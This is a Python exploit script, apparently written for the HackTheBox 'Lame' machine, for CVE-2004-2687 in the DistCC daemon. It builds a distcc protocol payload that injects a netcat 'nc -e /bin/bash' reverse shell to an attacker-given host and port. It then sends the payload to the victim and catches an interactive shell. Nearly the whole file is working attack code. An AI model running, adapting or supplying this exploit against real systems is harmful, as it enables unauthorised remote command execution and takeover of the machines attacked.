#!/usr/bin/python
#coding: utf-8

# DistCC Daemon Command Execution
# CVE: 2004-2687
# Exploit author: HD Moore "hdm"
# https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec
# Python script author: k4miyo
# lame.py author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>
# https://github.com/nullarmor/hackthebox-exploits/tree/master/lame

import argparse
import random
import string
import sys
import threading
import time

from pwn import *

# Ignore warnings
if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

# Ctrl_C
def def_handler(sig,frame):
    print("[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
rhost = "" # Remote host
rport = 3632 # Remote port
lhost = "" # Local host
lport = 443 # Local port

# Generate a random string of fixed length
def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# Exploit
def exploit():
    try:
        p1 = log.progress("Payload")
        p1.status("Generaiting payload")
        time.sleep(2)
        magic_padding = "A" * (10 + ((len(lhost) - 10) * -1))
        rev_shell = "echo AA;echo AAAA;echo {};echo AAAAAAAAAA;echo AAAAAAAAAA;echo AAAAAAA;nc -e /bin/bash {} {}".format(magic_padding, lhost, lport)
        rces = ["sh", "-c", "'({})'".format(rev_shell)]
        payload = "DIST00000001"
        payload += "ARGC00000008"
        for index, rce in enumerate(rces):
            if index == 2:
                full_rce = ""
                for index_, rce_ in enumerate(rces):
                    full_rce += "{} ".format(rce_)
                else:
                    full_rce = full_rce[:-1]
                payload += "ARGV{}{}{}".format("0" * 6, hex(len(full_rce))[2:], full_rce)
            else:
                payload += "ARGV{}{}{}".format("0" * 7, len(rce), rce)
        payload += "ARGV00000001#"
        payload += "ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.o"
    except Exception as e:
        log.error(str(e))
        p1.failure("Failed to craft the payload!")
        time.sleep(2)
        sys.exit(1)
    else:
        p1.success("Payload generated!")
        time.sleep(2)
        p2 = log.progress("Execution")
        p2.status("Exploiting vulnerability...")
        time.sleep(2)
        try:
            p2.status("Loading payload...")
            time.sleep(2)
            r = remote(rhost, rport)
            r.send(payload)
            r.send("DOTI0000000A#{}\n".format(randomString()))
        except Exception as e:
            log.error(str(e))
            p2.failure("Failed to exploit! :(")
            time.sleep(2)
            sys.exit(1)
        else:
            p2.success("DistCC Daemon exploited with success!")

# Main
if __name__ == "__main__":
    argparser = argparse.ArgumentParser(description='DistCC Daemon Command Execution')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (Victim)',
            required=True)
    argparser.add_argument('--rport', type=int,
            help='Remote port (default: 3632)',
            default=3632)
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    args = argparser.parse_args()
    
    # Variables
    rhost = args.rhost
    rport = args.rport
    lhost = args.lhost
    lport = args.lport
    
    try:
        threading.Thread(target=exploit()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(lport, timeout=20).wait_for_connection()
    p3 = log.progress("Connection")
    p3.status("Waiting for connection")
    time.sleep(2)

    if shell.sock is None:
        p3.failure("No connection")
        time.sleep(2)
        sys.exit(1)
    else:
        p3.success("Established connection")
        time.sleep(2)

    shell.interactive()
